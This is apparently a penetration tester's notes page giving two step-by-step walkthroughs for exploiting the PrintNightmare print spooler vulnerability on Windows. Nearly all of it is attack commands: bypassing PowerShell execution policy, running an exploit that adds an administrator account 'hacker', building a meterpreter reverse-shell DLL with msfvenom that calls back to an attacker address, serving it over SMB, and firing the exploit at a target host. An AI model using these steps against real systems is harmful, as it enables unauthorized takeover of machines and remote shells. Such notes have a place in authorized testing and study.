# Print Nightmare

OS: Linux, Windows
Description: PrintNightmare
Security Domains: Privilege Escalation (https://www.notion.so/Privilege-Escalation-1444c8e523768043add9c30147563fd8?pvs=21)
Target_Technology: PowerShell (https://www.notion.so/PowerShell-1434c8e52376805dba60efbabdb026bf?pvs=21), Bash (https://www.notion.so/Bash-1434c8e5237680b5aa14d2174d201e9a?pvs=21), python (https://www.notion.so/python-1444c8e523768064b118fb3c0d424051?pvs=21)

```jsx
https://github.com/cube0x0/CVE-2021-1675
```

- Check for Print Spooler

```jsx
ls \\localhost\pipe\spoolss
```

- Bypass Execution Policy

```jsx
Set-ExecutionPolicy Bypass -Scope Process
```

- Import and run

```jsx
Import-Module .\CVE-2021-1675.ps1
Invoke-Nightmare -NewUser "hacker" -NewPassword "Pwnd1234!" -DriverName "PrintIt"
```

### Another Walkthrough

### PrintNightmare

```jsx
git clone https://github.com/cube0x0/CVE-2021-1675.git
```

- Install Alternate Version of Impacket

```jsx
pip3 uninstall impacket
git clone https://github.com/cube0x0/impacket
cd impacket
python3 ./setup.py install
```

- Check for Print System Asynchronous Protocol

```jsx
rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'
```

- Create a DLL

```jsx
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.225 LPORT=8080 -f dll > backupscript.dll
```

- Serve it up

```jsx
sudo smbserver.py -smb2support CompData /path/to/backupscript.dll
```

- Multi/Handler

```jsx
 use exploit/multi/handler
 set PAYLOAD windows/x64/meterpreter/reverse_tcp
```

- Run that bad boy

```jsx
sudo python3 CVE-2021-1675.py TargetDomain/TargetUser:TargetPassword@172.16.5.5 '\\172.16.5.225\CompData\backupscript.dll'

```